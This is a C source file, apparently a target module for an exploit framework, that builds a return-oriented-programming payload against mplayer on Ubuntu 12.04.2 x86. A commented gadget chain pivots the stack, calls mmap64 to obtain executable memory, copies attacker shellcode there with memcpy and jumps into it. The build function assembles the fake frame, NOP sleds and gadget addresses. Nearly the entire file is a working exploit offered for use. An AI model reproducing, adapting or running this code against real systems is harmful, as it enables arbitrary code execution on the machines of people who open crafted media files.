/* Copyright (C) 2014 Lab Mouse Security
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License version 2 as
 * published by the Free Software Foundation.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */
/*
###############################################################
#
# gadget chain
#

# stack pivot chain
#
_usr_bin_mplayer: asm=RET found at offset=324088 realistic_peer=17,7
POP ESI
SBB AL, 0x8b
POP ESP
AND AL, 0x20
MOV ESI, [ESP+0x24]
MOV EDI, [ESP+0x28]
ADD ESP, 0x2c

# stack padding chain
#
_usr_bin_mplayer: asm=RET found at offset=346519 realistic_peer=6,1
ADD ESP, 0x13c		# create padding

_usr_bin_mplayer: asm=RET found at offset=346519 realistic_peer=6,1
ADD ESP, 0x13c		# create padding

# call mmap64@plt
#
0x08085200

# populate_memcpy
#
_usr_bin_mplayer: asm=RET found at offset=402114 realistic_peer=3,1
ADD ESP, 0x2c		# skip past mmap args

_usr_bin_mplayer: asm=RET found at offset=378560 realistic_peer=12,3
INC EBX
LEA ESI, [ESI+0x0]
LEA EDI, [EDI+0x0]

_usr_bin_mplayer: asm=CALL DWORD [EBX+0x8] found at offset=288085 realistic_peer=19,4
LEA ESI, [ESP+0x28]
MOV [ESP+0x8], ESI
MOV DWORD [ESP+0x4], 0x13
MOV [ESP], EBX

_usr_bin_mplayer: asm=RET found at offset=404261 realistic_peer=3,1
ADD ESP, 0x6c	# skip past args

_usr_bin_mplayer: asm=RET found at offset=406743 realistic_peer=1,1
POP EBP

# call fast_memcpy
#
   0x081c2a66 <+70>:    mov    %ebp,0x8(%esp)
   0x081c2a6a <+74>:    mov    %esi,0x4(%esp)
   0x081c2a6e <+78>:    mov    %eax,(%esp)
   0x081c2a71 <+81>:    call   0x80826c0 <memcpy@plt>
   0x081c2a76 <+86>:    mov    0x30(%esp),%eax
   0x081c2a7a <+90>:    add    $0x1c,%esp
   0x081c2a7d <+93>:    pop    %ebx
   0x081c2a7e <+94>:    pop    %esi
   0x081c2a7f <+95>:    pop    %edi
   0x081c2a80 <+96>:    pop    %ebp
   0x081c2a81 <+97>:    ret

# call_shellcode
#
_usr_bin_mplayer: asm=RET found at offset=15009 realistic_peer=1,1
POP ESI		# reverse back a bit

_usr_bin_mplayer: asm=RET found at offset=14757 realistic_peer=2,1
SUB ESP, ESI	# return to the source addr off the stack

#
###############################################################
*/
#include <crush.h>

#define FAKE_REGISTER 			0xa7a7a7a7UL
#define FRAME_BYTES (1024 + 256 + 256 + 256)

#define GADGET_BASE_ADDRESS		0x08048000UL
#define GADGET_ADDRESS(x, y)		(GADGET_BASE_ADDRESS + (x) - (y))

#define STACK_PIVOT_G1 			GADGET_ADDRESS(324088, 17)

#define STACK_PADDING_G1		GADGET_ADDRESS(346519, 6)
#define STACK_PADDING_G2		GADGET_ADDRESS(346519, 6)
#define STACK_PADDING_SIZE		0x13c

#define MMAP64_AT_PLT			0x08085200UL

#define POPULATE_FOR_MEMCPY_G1		GADGET_ADDRESS(402114, 3)
#define POPULATE_FOR_MEMCPY_G2		GADGET_ADDRESS(378560, 12)
#define POPULATE_FOR_MEMCPY_G3		GADGET_ADDRESS(288085, 19)
#define POPULATE_FOR_MEMCPY_G3_PADDING (0x6c - 4)
#define POPULATE_FOR_MEMCPY_G4		GADGET_ADDRESS(404261, 3)
#define POPULATE_FOR_MEMCPY_G5		GADGET_ADDRESS(406743, 1)

#define FAST_MEMCPY			0x081c2a66UL

#define CALL_SHELLCODE_G1		GADGET_ADDRESS(15009, 1)
#define CALL_SHELLCODE_STACK_ADJUST	56
#define CALL_SHELLCODE_G2		GADGET_ADDRESS(14757, 2)

#define OFFSET_OF_SHELLCODE		0x60

#define SHELLCODE_MEMCPY_SIZE		1024

static Boolean
build(unsigned char const * input, int ninput, unsigned char ** output, int * noutput)
{
	unsigned char * buffer;
	unsigned char * p;
	unsigned char * q;
	unsigned char * s;
	unsigned int * l;
	int n;

	if(ninput > NSIZE)
	{       
		error(False, "payload size exceeds maximum (%d > %d)", ninput, NSIZE);
		return False;
	}

	buffer = calloc(1024, (64 * 1024));
	if(!buffer)
	{
		error(True, "calloc");
		return False;
	}

	p = buffer;

	{
		*p++ = 0;
		*p++ = 0;
		*p++ = 0;
		*p++ = 0;
		*p++ = 0;
		*p++ = 0;
		*p++ = 0;
		*p++ = 244;

		q = p;

		q += 8;
		l = (unsigned int * )q;
		*l++ = POPULATE_FOR_MEMCPY_G4;

		q = p;
		q += 0x2c; 	/* add padding */
		l = (unsigned int * )q;
		*l++ = STACK_PADDING_G1;

		/* skip requisite padding size */
		q = (unsigned char * )l;
		q += STACK_PADDING_SIZE;
		l = (unsigned int * )q;
		*l++ = STACK_PADDING_G2;
		q = (unsigned char * )l;
		q += STACK_PADDING_SIZE;
		l = (unsigned int * )q;
		*l++ = MMAP64_AT_PLT;

		/* mmap64 call */
		*l++ = POPULATE_FOR_MEMCPY_G1;
		*l++ = 0;
		*l++ = 8192;
		*l++ = (PROT_READ|PROT_WRITE|PROT_EXEC);
		*l++ = (MAP_ANONYMOUS|MAP_PRIVATE);
		*l++ = -1;
		*l++ = 0;
		*l++ = 0; /* don't forget the top 32bits for mmap64's offset64 */

		/* skip over extras */
		*l++ = FAKE_REGISTER;
		*l++ = FAKE_REGISTER;
		*l++ = FAKE_REGISTER;
		*l++ = FAKE_REGISTER;

		/* populate memcpy */

		/* increment ebx past talloc header */
		*l++ = POPULATE_FOR_MEMCPY_G2;
		*l++ = POPULATE_FOR_MEMCPY_G2;
		*l++ = POPULATE_FOR_MEMCPY_G2;
		*l++ = POPULATE_FOR_MEMCPY_G2;
		*l++ = POPULATE_FOR_MEMCPY_G2;
		*l++ = POPULATE_FOR_MEMCPY_G2;
		*l++ = POPULATE_FOR_MEMCPY_G2;
		*l++ = POPULATE_FOR_MEMCPY_G2;
		*l++ = POPULATE_FOR_MEMCPY_G2;
		*l++ = POPULATE_FOR_MEMCPY_G2;
		*l++ = POPULATE_FOR_MEMCPY_G2;
		*l++ = POPULATE_FOR_MEMCPY_G2;
		*l++ = POPULATE_FOR_MEMCPY_G2;
		*l++ = POPULATE_FOR_MEMCPY_G2;
		*l++ = POPULATE_FOR_MEMCPY_G2;
		*l++ = POPULATE_FOR_MEMCPY_G2;
		*l++ = POPULATE_FOR_MEMCPY_G2;
		*l++ = POPULATE_FOR_MEMCPY_G2;
		*l++ = POPULATE_FOR_MEMCPY_G2;
		*l++ = POPULATE_FOR_MEMCPY_G2;
		*l++ = POPULATE_FOR_MEMCPY_G2;
		*l++ = POPULATE_FOR_MEMCPY_G2;
		*l++ = POPULATE_FOR_MEMCPY_G2;
		*l++ = POPULATE_FOR_MEMCPY_G2;
		*l++ = POPULATE_FOR_MEMCPY_G2;
		*l++ = POPULATE_FOR_MEMCPY_G2;
		*l++ = POPULATE_FOR_MEMCPY_G2;
		*l++ = POPULATE_FOR_MEMCPY_G2;
		*l++ = POPULATE_FOR_MEMCPY_G2;
		*l++ = POPULATE_FOR_MEMCPY_G2;
		*l++ = POPULATE_FOR_MEMCPY_G2;
		*l++ = POPULATE_FOR_MEMCPY_G2;
		*l++ = POPULATE_FOR_MEMCPY_G2;
		*l++ = POPULATE_FOR_MEMCPY_G2;
		*l++ = POPULATE_FOR_MEMCPY_G2;
		*l++ = POPULATE_FOR_MEMCPY_G2;
		*l++ = POPULATE_FOR_MEMCPY_G2;
		*l++ = POPULATE_FOR_MEMCPY_G2;
		*l++ = POPULATE_FOR_MEMCPY_G2;
		*l++ = POPULATE_FOR_MEMCPY_G2;
		*l++ = POPULATE_FOR_MEMCPY_G2;
		*l++ = POPULATE_FOR_MEMCPY_G2;
		*l++ = POPULATE_FOR_MEMCPY_G2;
		*l++ = POPULATE_FOR_MEMCPY_G2;
		*l++ = POPULATE_FOR_MEMCPY_G2;
		*l++ = POPULATE_FOR_MEMCPY_G2;
		*l++ = POPULATE_FOR_MEMCPY_G2;
		*l++ = POPULATE_FOR_MEMCPY_G2;
		*l++ = POPULATE_FOR_MEMCPY_G3;

		q = (unsigned char * )l;
		s = q;
		memset(q, 0x90, POPULATE_FOR_MEMCPY_G3_PADDING);
		s += 56;
		/* encode JMP here */
		*s++ = 0xe9; /* 16bit rel */
		*s++ = POPULATE_FOR_MEMCPY_G3_PADDING + 10;
		*s++ = 0;
		*s++ = 0;
		*s++ = 0;
		*s++ = 0;
		q += POPULATE_FOR_MEMCPY_G3_PADDING;

		l = (unsigned int * )q;
		*l++ = POPULATE_FOR_MEMCPY_G5;
		*l++ = SHELLCODE_MEMCPY_SIZE;
		*l++ = FAST_MEMCPY;

		q = (unsigned char * )l;
		q += 0x1c; /* padding for fast_memcpy */
		l = (unsigned int * )q;
		*l++ = FAKE_REGISTER;
		*l++ = FAKE_REGISTER;
		*l++ = FAKE_REGISTER;
		*l++ = FAKE_REGISTER;
		*l++ = CALL_SHELLCODE_G1;

		*l++ = CALL_SHELLCODE_STACK_ADJUST;
		*l++ = CALL_SHELLCODE_G2;

		n = (char * )l - (char * )p;
		msg(MsgVerbose, "total of %d bytes encoded to the fake frame\n", n);

		n = FRAME_BYTES - n;
		p = (unsigned char * )l;

		msg(MsgVerbose, "padding a total of %d bytes with NOP\n", n);
		memset(p, 0x90, n);
		q = p;
		p += n;

                /* the rest of the shellcode payload goes here */
                q += 32;
		q -= 29; /* XXX where the payload actually starts */
		memcpy(q, input, ninput);

		*p++ = 32;

		p += 16843001;
		*p++ = (139 + 23 + 28 - 2);
		*p++ = 16;
		*p++ = 0;

		*p++ = 0; 
		*p++ = 18; /* generate 4 bytes */

		l = (unsigned int * )p;
		*l++ = STACK_PIVOT_G1;
		*l++ = 0;
		*l++ = 0;
		*l++ = 0xe814ec70;
		*l++ = 0;
		*l++ = 0;
		*l++ = 0;
		*l++ = 0;
		*l++ = 0;
		p = (unsigned char * )l;

		*p++ = 17;
		*p++ = 0;
		*p++ = 0;
	}

	*noutput = p - buffer;
	*output = buffer;

	return True;
}

Crushlet
ubuntu_12_04_2_x86 =
{       
        "ubuntu_12_04_2_x86",
        Platform_Linux,
        Architecture_x86,

        NULL,
        NULL,
        build
};

